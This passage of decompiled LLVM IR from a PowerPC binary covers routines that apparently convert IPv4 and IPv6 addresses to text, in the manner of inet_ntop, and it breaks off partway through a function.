  br i1 %v3_1000be1034, label %dec_label_pc_1000be18, label %dec_label_pc_1000bd40.lr.ph

dec_label_pc_1000bd40.lr.ph:                      ; preds = %dec_label_pc_1000bd34, %dec_label_pc_1000bdb4
  %v1_1000be0c3341 = phi i32 [ %v1_1000be0c33, %dec_label_pc_1000bdb4 ], [ %v1_1000be0c3339, %dec_label_pc_1000bd34 ]
  br label %dec_label_pc_1000bd40

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bd78
  %v3_1000bdd4 = icmp eq i32 %v0_1000bd78, 46
  br i1 %v3_1000bdd4, label %dec_label_pc_1000bddc, label %dec_label_pc_1000beb4

dec_label_pc_1000bddc:                            ; preds = %dec_label_pc_1000bdd4
  %v0_1000bddc = load i32, i32* @r31, align 4
  %v1_1000bddc = add i32 %v0_1000bddc, 4
  store i32 %v1_1000bddc, i32* @r30, align 4
  %v1_1000bde0 = load i32, i32* @r27, align 4
  %v3_1000bde0 = icmp ugt i32 %v1_1000bddc, %v1_1000bde0
  br i1 %v3_1000bde0, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bde8

dec_label_pc_1000bde8:                            ; preds = %dec_label_pc_1000bddc
  %v0_1000bdec = load i32, i32* @r26, align 4
  store i32 %v0_1000bdec, i32* %r3.global-to-local, align 4
  store i32 268484084, i32* @lr, align 4
  %v3_1000bdf0 = call i32 @function_1000bbe4(i32 %v0_1000bdec, i32 %v0_1000bddc)
  store i32 %v3_1000bdf0, i32* %r3.global-to-local, align 4
  %v0_1000bdf4 = load i32, i32* @r30, align 4
  store i32 %v0_1000bdf4, i32* @r31, align 4
  %v2_1000bdf8 = icmp sgt i32 %v3_1000bdf0, 0
  br i1 %v2_1000bdf8, label %dec_label_pc_1000be3c, label %dec_label_pc_1000beb4

dec_label_pc_1000be04:                            ; preds = %dec_label_pc_1000bd60
  store i32 1, i32* @r23, align 4
  %v0_1000be08.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000be08.backedge

dec_label_pc_1000be08.backedge:                   ; preds = %dec_label_pc_1000be04, %dec_label_pc_1000bd90
  %v0_1000be08.be = phi i32 [ %v0_1000be08.pre.pre, %dec_label_pc_1000be04 ], [ %v0_1000bd94, %dec_label_pc_1000bd90 ]
  %v1_1000be08 = inttoptr i32 %v0_1000be08.be to i8*
  %v2_1000be08 = load i8, i8* %v1_1000be08, align 1
  %v3_1000be08 = zext i8 %v2_1000be08 to i32
  store i32 %v3_1000be08, i32* %r3.global-to-local, align 4
  store i32 268484112, i32* @lr, align 4
  %v1_1000be0c = call i32 @function_1000cab4(i32 %v3_1000be08)
  store i32 %v1_1000be0c, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be0c, i32* @r30, align 4
  %v3_1000be10 = icmp eq i32 %v1_1000be0c, 0
  br i1 %v3_1000be10, label %dec_label_pc_1000be18, label %dec_label_pc_1000bd40

dec_label_pc_1000be18:                            ; preds = %dec_label_pc_1000be08.backedge, %dec_label_pc_1000bd34, %dec_label_pc_1000bdb4
  %v0_1000be18 = load i32, i32* @r23, align 4
  %v3_1000be18 = icmp eq i32 %v0_1000be18, 0
  %v0_1000be80.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000be18, label %dec_label_pc_1000be3c, label %dec_label_pc_1000be20

dec_label_pc_1000be20:                            ; preds = %dec_label_pc_1000be18
  %v1_1000be20 = add i32 %v0_1000be80.pre.pre, 2
  store i32 %v1_1000be20, i32* %r0.global-to-local, align 4
  %v1_1000be24 = load i32, i32* @r27, align 4
  %v3_1000be24 = icmp ugt i32 %v1_1000be20, %v1_1000be24
  br i1 %v3_1000be24, label %dec_label_pc_1000beb4, label %dec_label_pc_1000be2c

dec_label_pc_1000be2c:                            ; preds = %dec_label_pc_1000be20
  %v0_1000be2c = load i32, i32* @r28, align 4
  %v1_1000be2c = udiv i32 %v0_1000be2c, 256
  store i32 %v1_1000be2c, i32* %r0.global-to-local, align 4
  %v1_1000be30 = trunc i32 %v0_1000be2c to i8
  %v3_1000be30 = add i32 %v0_1000be80.pre.pre, 1
  %v4_1000be30 = inttoptr i32 %v3_1000be30 to i8*
  store i8 %v1_1000be30, i8* %v4_1000be30, align 1
  %v0_1000be34 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000be34 = trunc i32 %v0_1000be34 to i8
  %v2_1000be34 = load i32, i32* @r31, align 4
  %v3_1000be34 = inttoptr i32 %v2_1000be34 to i8*
  store i8 %v1_1000be34, i8* %v3_1000be34, align 1
  %v0_1000be38 = load i32, i32* @r31, align 4
  %v1_1000be38 = add i32 %v0_1000be38, 2
  store i32 %v1_1000be38, i32* @r31, align 4
  br label %dec_label_pc_1000be3c

dec_label_pc_1000be3c:                            ; preds = %dec_label_pc_1000be18, %dec_label_pc_1000bde8, %dec_label_pc_1000be2c
  %v0_1000be80.pre = phi i32 [ %v0_1000bdf4, %dec_label_pc_1000bde8 ], [ %v1_1000be38, %dec_label_pc_1000be2c ], [ %v0_1000be80.pre.pre, %dec_label_pc_1000be18 ]
  %v0_1000be3c = load i32, i32* @r24, align 4
  %v3_1000be3c = icmp eq i32 %v0_1000be3c, 0
  %v1_1000be80.pre = load i32, i32* @r27, align 4
  %v4_1000be80 = icmp eq i32 %v0_1000be80.pre, %v1_1000be80.pre
  br i1 %v3_1000be3c, label %dec_label_pc_1000be80, label %dec_label_pc_1000be44

dec_label_pc_1000be44:                            ; preds = %dec_label_pc_1000be3c
  %v2_1000be48 = sub i32 %v0_1000be80.pre, %v0_1000be3c
  store i32 %v2_1000be48, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000be80, label %dec_label_pc_1000beb4, label %dec_label_pc_1000be68.preheader

dec_label_pc_1000be68.preheader:                  ; preds = %dec_label_pc_1000be44
  %v3_1000be6824 = icmp slt i32 %v2_1000be48, 1
  %v2_1000be6c26 = add i32 %v2_1000be48, -1
  store i32 %v2_1000be6c26, i32* %r11.global-to-local, align 4
  %v2_1000be7027 = add i32 %v1_1000be80.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000be6824, label %dec_label_pc_1000be80.thread, label %dec_label_pc_1000be5c

dec_label_pc_1000be5c:                            ; preds = %dec_label_pc_1000be68.preheader, %dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge
  %v0_1000be5c = phi i32 [ %v0_1000be5c.pre, %dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge ], [ %v0_1000be3c, %dec_label_pc_1000be68.preheader ]
  %v2_1000be7029 = phi i32 [ %v2_1000be70, %dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge ], [ %v2_1000be7027, %dec_label_pc_1000be68.preheader ]
  %v2_1000be6c28 = phi i32 [ %v2_1000be6c, %dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge ], [ %v2_1000be6c26, %dec_label_pc_1000be68.preheader ]
  %v2_1000be5c = add i32 %v0_1000be5c, %v2_1000be6c28
  %v3_1000be5c = inttoptr i32 %v2_1000be5c to i8*
  %v4_1000be5c = load i8, i8* %v3_1000be5c, align 1
  %v5_1000be5c = zext i8 %v4_1000be5c to i32
  store i32 %v5_1000be5c, i32* %r0.global-to-local, align 4
  %v3_1000be60 = inttoptr i32 %v2_1000be7029 to i8*
  store i8 %v4_1000be5c, i8* %v3_1000be60, align 1
  %v0_1000be64 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000be64 = load i32, i32* @r24, align 4
  %v2_1000be64 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000be64 = trunc i32 %v0_1000be64 to i8
  %v4_1000be64 = add i32 %v2_1000be64, %v1_1000be64
  %v5_1000be64 = inttoptr i32 %v4_1000be64 to i8*
  store i8 %v3_1000be64, i8* %v5_1000be64, align 1
  %v0_1000be68.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000be68.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000be70.pre = load i32, i32* @r27, align 4
  %v3_1000be68 = icmp slt i32 %v1_1000be68.pre, %v0_1000be68.pre
  %v2_1000be6c = sub i32 %v1_1000be68.pre, %v0_1000be68.pre
  store i32 %v2_1000be6c, i32* %r11.global-to-local, align 4
  %v1_1000be74 = add i32 %v0_1000be68.pre, 1
  store i32 %v1_1000be74, i32* %r9.global-to-local, align 4
  br i1 %v3_1000be68, label %dec_label_pc_1000be80.thread, label %dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge

dec_label_pc_1000be5c.dec_label_pc_1000be5c_crit_edge: ; preds = %dec_label_pc_1000be5c
  %v2_1000be70 = sub i32 %v1_1000be70.pre, %v0_1000be68.pre
  %v0_1000be5c.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be80.thread:                     ; preds = %dec_label_pc_1000be5c, %dec_label_pc_1000be68.preheader
  %v0_1000be7c.lcssa = phi i32 [ %v1_1000be80.pre, %dec_label_pc_1000be68.preheader ], [ %v1_1000be70.pre, %dec_label_pc_1000be5c ]
  store i32 %v0_1000be7c.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000be88

dec_label_pc_1000be80:                            ; preds = %dec_label_pc_1000be3c
  br i1 %v4_1000be80, label %dec_label_pc_1000be88, label %dec_label_pc_1000beb4

dec_label_pc_1000be88:                            ; preds = %dec_label_pc_1000be80.thread, %dec_label_pc_1000be80
  %v0_1000be88 = load i32, i32* @r22, align 4
  store i32 %v0_1000be88, i32* @r3, align 4
  store i32 %v2_1000bd04, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000be98.330 to i32), i32* @lr, align 4
  %v0_1000be94 = call i32 @function_10006d88()
  store i32 %v0_1000be94, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000bea0:                            ; preds = %dec_label_pc_1000bce4
  %v0_1000bea0 = call i32 @function_10004b48()
  store i32 %v0_1000bea0, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000beac = inttoptr i32 %v0_1000bea0 to i32*
  store i32 97, i32* %v2_1000beac, align 4
  %v0_1000bebc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000bda8, %dec_label_pc_1000bd9c, %dec_label_pc_1000bd60, %dec_label_pc_1000bd88, %dec_label_pc_1000be44, %dec_label_pc_1000bde8, %dec_label_pc_1000bdd4, %dec_label_pc_1000be80, %dec_label_pc_1000bd28, %dec_label_pc_1000be20, %dec_label_pc_1000bddc
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000beb8:                            ; preds = %dec_label_pc_1000bea0, %dec_label_pc_1000be88, %dec_label_pc_1000bcf0, %dec_label_pc_1000beb4
  %v0_1000bebc = phi i32 [ %v0_1000bebc.pre, %dec_label_pc_1000bea0 ], [ 1, %dec_label_pc_1000be88 ], [ %v3_1000bcf8, %dec_label_pc_1000bcf0 ], [ 0, %dec_label_pc_1000beb4 ]
  store i32 %v0_1000bcc8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bebc, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bebc

; uselistorder directives
  uselistorder i32 %v0_1000bebc, { 1, 0 }
  uselistorder i32 %v2_1000be6c, { 1, 0 }
  uselistorder i32 %v0_1000be68.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000be80, { 1, 0 }
  uselistorder i32 %v0_1000be80.pre, { 1, 0 }
  uselistorder i32 %v0_1000be2c, { 1, 0 }
  uselistorder i32 %v0_1000be80.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000be0c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000bdb4, { 1, 0 }
  uselistorder i32 %v1_1000bd64, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 1, 2, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 1, 14, 11, 12, 3, 2, 13, 5, 4, 15, 16, 17, 18, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000cab4, { 2, 1, 0 }
  uselistorder i32 268484112, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000bbe4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000beb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000beb4, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000be88, { 1, 0 }
  uselistorder label %dec_label_pc_1000be5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000be3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000be18, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bd40.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd40, { 1, 0 }
}

define i32 @function_1000bed0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf28.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000bed4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000bef8 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000bef8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000bf0c.333 to i32), i32* @lr, align 4
  %v3_1000bf08 = call i32 @function_10006e24(i32 %v2_1000bef8, i32 0, i32 15)
  store i32 %v3_1000bf08, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000bfcc2 = load i32, i32* @r1, align 4
  store i32 %v0_1000bfcc2, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bf28

dec_label_pc_1000bf28:                            ; preds = %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge, %dec_label_pc_1000bf28.lr.ph
  %v2_1000bf48 = phi i32 [ %v2_1000bfcc, %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge ], [ %v0_1000bfcc2, %dec_label_pc_1000bf28.lr.ph ]
  %v0_1000bf38 = phi i32 [ %v0_1000bfcc, %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge ], [ %v0_1000bfcc2, %dec_label_pc_1000bf28.lr.ph ]
  %v0_1000bf2c = phi i32 [ %v1_1000bfcc, %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge ], [ 0, %dec_label_pc_1000bf28.lr.ph ]
  %v1_1000bf34 = phi i32 [ %v1_1000bf28.pre, %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge ], [ 0, %dec_label_pc_1000bf28.lr.ph ]
  %v0_1000bf28 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bf28 = add i32 %v0_1000bf28, %v1_1000bf34
  %v3_1000bf28 = inttoptr i32 %v2_1000bf28 to i8*
  %v4_1000bf28 = load i8, i8* %v3_1000bf28, align 1
  %v5_1000bf28 = zext i8 %v4_1000bf28 to i32
  store i32 %v5_1000bf28, i32* %r10.global-to-local, align 4
  store i32 %v0_1000bf2c, i32* %r8.global-to-local, align 4
  %v1_1000bf30 = add i32 %v0_1000bf2c, 1
  store i32 %v1_1000bf30, i32* %r11.global-to-local, align 4
  store i32 %v2_1000bf28, i32* %r3.global-to-local, align 4
  %v2_1000bf38 = add i32 %v1_1000bf30, %v0_1000bf38
  store i32 %v2_1000bf38, i32* %r6.global-to-local, align 4
  %v1_1000bf3c = load i32, i32* @r28, align 4
  %v2_1000bf3c = udiv i32 %v5_1000bf28, %v1_1000bf3c
  %v1_1000bf40 = add nuw nsw i32 %v2_1000bf3c, 48
  %v1_1000bf44 = urem i32 %v1_1000bf40, 256
  store i32 %v1_1000bf44, i32* %r0.global-to-local, align 4
  %v1_1000bf48 = trunc i32 %v1_1000bf40 to i8
  %v3_1000bf48 = add i32 %v2_1000bf48, 8
  %v4_1000bf48 = inttoptr i32 %v3_1000bf48 to i8*
  store i8 %v1_1000bf48, i8* %v4_1000bf48, align 1
  %v0_1000bf4c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000bf4c = icmp eq i32 %v0_1000bf4c, 48
  %v0_1000bf54 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bf54 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000bf54 = udiv i32 %v0_1000bf54, %v1_1000bf54
  store i32 %v2_1000bf54, i32* %r9.global-to-local, align 4
  br i1 %v3_1000bf4c, label %dec_label_pc_1000bf54, label %dec_label_pc_1000bf80

dec_label_pc_1000bf54:                            ; preds = %dec_label_pc_1000bf28
  %v2_1000bf58 = udiv i32 %v2_1000bf54, %v1_1000bf54
  %tmp18 = mul i32 %v2_1000bf58, -10
  %v2_1000bf60 = add i32 %v2_1000bf54, 48
  %v1_1000bf64 = add i32 %v2_1000bf60, %tmp18
  store i32 %v1_1000bf64, i32* %r9.global-to-local, align 4
  %v1_1000bf68 = urem i32 %v1_1000bf64, 256
  store i32 %v1_1000bf68, i32* %r0.global-to-local, align 4
  %v1_1000bf6c = trunc i32 %v1_1000bf64 to i8
  %v2_1000bf6c = load i32, i32* %r7.global-to-local, align 4
  %v3_1000bf6c = add i32 %v2_1000bf6c, 8
  %v4_1000bf6c = inttoptr i32 %v3_1000bf6c to i8*
  store i8 %v1_1000bf6c, i8* %v4_1000bf6c, align 1
  %v0_1000bf70 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000bf70 = icmp eq i32 %v0_1000bf70, 48
  br i1 %v3_1000bf70, label %dec_label_pc_1000bf9c, label %dec_label_pc_1000bf78

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf54
  %v0_1000bf78 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000bf78, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bf9c

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bf28
  %v0_1000bf84 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bf84 = add i32 %v0_1000bf84, 1
  store i32 %v1_1000bf84, i32* %r8.global-to-local, align 4
  %v2_1000bf88 = udiv i32 %v2_1000bf54, %v1_1000bf54
  %v1_1000bf8c = mul i32 %v2_1000bf88, 10
  store i32 %v1_1000bf8c, i32* %r0.global-to-local, align 4
  %v2_1000bf90 = sub i32 %v2_1000bf54, %v1_1000bf8c
  %v1_1000bf94 = add i32 %v2_1000bf90, 48
  store i32 %v1_1000bf94, i32* %r9.global-to-local, align 4
  %v1_1000bf98 = trunc i32 %v1_1000bf94 to i8
  %v2_1000bf98 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000bf98 = add i32 %v2_1000bf98, 8
  %v4_1000bf98 = inttoptr i32 %v3_1000bf98 to i8*
  store i8 %v1_1000bf98, i8* %v4_1000bf98, align 1
  br label %dec_label_pc_1000bf9c

dec_label_pc_1000bf9c:                            ; preds = %dec_label_pc_1000bf54, %dec_label_pc_1000bf78, %dec_label_pc_1000bf80
  %v0_1000bf9c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bf9c = inttoptr i32 %v0_1000bf9c to i8*
  %v2_1000bf9c = load i8, i8* %v1_1000bf9c, align 1
  %v3_1000bf9c = zext i8 %v2_1000bf9c to i32
  %v0_1000bfa0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bfa0 = add i32 %v0_1000bfa0, 1
  %v0_1000bfa4 = load i32, i32* @r1, align 4
  %v2_1000bfa4 = add i32 %v0_1000bfa4, %v0_1000bfa0
  store i32 %v2_1000bfa4, i32* %r10.global-to-local, align 4
  %v2_1000bfa8 = add i32 %v1_1000bfa0, %v0_1000bfa4
  store i32 %v2_1000bfa8, i32* %r8.global-to-local, align 4
  %v0_1000bfac = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bfac = add i32 %v0_1000bfac, 1
  store i32 %v1_1000bfac, i32* %r4.global-to-local, align 4
  %v1_1000bfb0 = add i32 %v0_1000bfa0, 2
  store i32 %v1_1000bfb0, i32* %r11.global-to-local, align 4
  %v1_1000bfb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000bfb4 = udiv i32 %v3_1000bf9c, %v1_1000bfb4
  %v1_1000bfb8 = mul nuw nsw i32 %v2_1000bfb4, 10
  store i32 %v1_1000bfb8, i32* %r0.global-to-local, align 4
  %v2_1000bfbc = sub nsw i32 %v3_1000bf9c, %v1_1000bfb8
  %v1_1000bfc0 = add nsw i32 %v2_1000bfbc, 48
  store i32 %v1_1000bfc0, i32* %r9.global-to-local, align 4
  %v1_1000bfc4 = trunc i32 %v1_1000bfc0 to i8
  %v3_1000bfc4 = add i32 %v2_1000bfa4, 8
  %v4_1000bfc4 = inttoptr i32 %v3_1000bfc4 to i8*
  store i8 %v1_1000bfc4, i8* %v4_1000bfc4, align 1
  %v0_1000bfc8 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000bfc8 = trunc i32 %v0_1000bfc8 to i8
  %v2_1000bfc8 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000bfc8 = add i32 %v2_1000bfc8, 8
  %v4_1000bfc8 = inttoptr i32 %v3_1000bfc8 to i8*
  store i8 %v1_1000bfc8, i8* %v4_1000bfc8, align 1
  %v0_1000bfcc = load i32, i32* @r1, align 4
  %v1_1000bfcc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000bfcc = add i32 %v1_1000bfcc, %v0_1000bfcc
  store i32 %v2_1000bfcc, i32* %r7.global-to-local, align 4
  %v0_1000bfd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bfd0 = add i32 %v0_1000bfd0, -1
  store i32 %v1_1000bfd0, i32* %ctr.global-to-local, align 4
  %v2_1000bfd0 = icmp eq i32 %v1_1000bfd0, 0
  br i1 %v2_1000bfd0, label %dec_label_pc_1000bfd4, label %dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge

dec_label_pc_1000bf9c.dec_label_pc_1000bf28_crit_edge: ; preds = %dec_label_pc_1000bf9c
  %v1_1000bf28.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000bf28

dec_label_pc_1000bfd4:                            ; preds = %dec_label_pc_1000bf9c
  %v2_1000bfd4 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000bfd4, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000bfdc = add i32 %v1_1000bfcc, %v2_1000bfd4
  store i32 %v2_1000bfdc, i32* %r9.global-to-local, align 4
  store i32 %v2_1000bfd4, i32* @r3, align 4
  %v3_1000bfe4 = add i32 %v2_1000bfdc, -1
  %v4_1000bfe4 = inttoptr i32 %v3_1000bfe4 to i8*
  store i8 0, i8* %v4_1000bfe4, align 1
  %v0_1000bfe8 = call i32 @function_10006ed4()
  store i32 %v0_1000bfe8, i32* %r3.global-to-local, align 4
  %v1_1000bfec = load i32, i32* @r30, align 4
  %v3_1000bfec = icmp ugt i32 %v0_1000bfe8, %v1_1000bfec
  br i1 %v3_1000bfec, label %dec_label_pc_1000bff4, label %dec_label_pc_1000c008

dec_label_pc_1000bff4:                            ; preds = %dec_label_pc_1000bfd4
  %v0_1000bff4 = call i32 @function_10004b48()
  store i32 %v0_1000bff4, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c000 = inttoptr i32 %v0_1000bff4 to i32*
  store i32 28, i32* %v2_1000c000, align 4
  %v0_1000c01c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c018

dec_label_pc_1000c008:                            ; preds = %dec_label_pc_1000bfd4
  %v0_1000c008 = load i32, i32* @r29, align 4
  store i32 %v0_1000c008, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bfd4, i32* %r4.global-to-local, align 4
  %v2_1000c010 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000c010 = call i32 @function_10006eb4(i32 %v0_1000c008, i8* %v2_1000c010)
  store i32 %v3_1000c010, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c010, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c018

dec_label_pc_1000c018:                            ; preds = %dec_label_pc_1000bff4, %dec_label_pc_1000c008
  %v0_1000c01c = phi i32 [ %v0_1000c01c.pre, %dec_label_pc_1000bff4 ], [ %v3_1000c010, %dec_label_pc_1000c008 ]
  store i32 %v0_1000bed4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c01c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c01c

; uselistorder directives
  uselistorder i32 %v0_1000c01c, { 1, 0 }
  uselistorder i32 %v2_1000bfd4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000bfd0, { 1, 0 }
  uselistorder i32 %v2_1000bfcc, { 1, 0 }
  uselistorder i32 %v0_1000bfa0, { 1, 0, 2 }
  uselistorder i32 %v3_1000bf9c, { 1, 0 }
  uselistorder i32 %v1_1000bf64, { 1, 0, 2 }
  uselistorder i32 %v2_1000bf54, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000bf40, { 1, 0 }
  uselistorder i32 %v0_1000bf2c, { 1, 0 }
  uselistorder i32 %v0_1000bfcc2, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14 }
  uselistorder i32 15, { 0, 1, 7, 6, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_1000c018, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf9c, { 2, 1, 0 }
}

define i32 @function_1000c030(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c030:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000c038 = icmp slt i32 %arg1, 2
  %v3_1000c038 = icmp eq i32 %arg1, 2
  store i1 %v1_1000c038, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c038, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000c038, label %dec_label_pc_1000c060, label %dec_label_pc_1000c054

dec_label_pc_1000c054:                            ; preds = %dec_label_pc_1000c030
  %v1_1000c054 = icmp slt i32 %arg1, 10
  %v3_1000c054 = icmp eq i32 %arg1, 10
  store i1 %v1_1000c054, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c054, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c054, label %dec_label_pc_1000c098.lr.ph, label %dec_label_pc_1000c2ac

dec_label_pc_1000c060:                            ; preds = %dec_label_pc_1000c030
  store i32 ptrtoint (i32* @global_var_1000c070.335 to i32), i32* @lr, align 4
  %v3_1000c06c = call i32 @function_1000bed0(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000c2a4

dec_label_pc_1000c098.lr.ph:                      ; preds = %dec_label_pc_1000c054
  %v2_1000c074 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000c074, i32* %r29.global-to-local, align 4
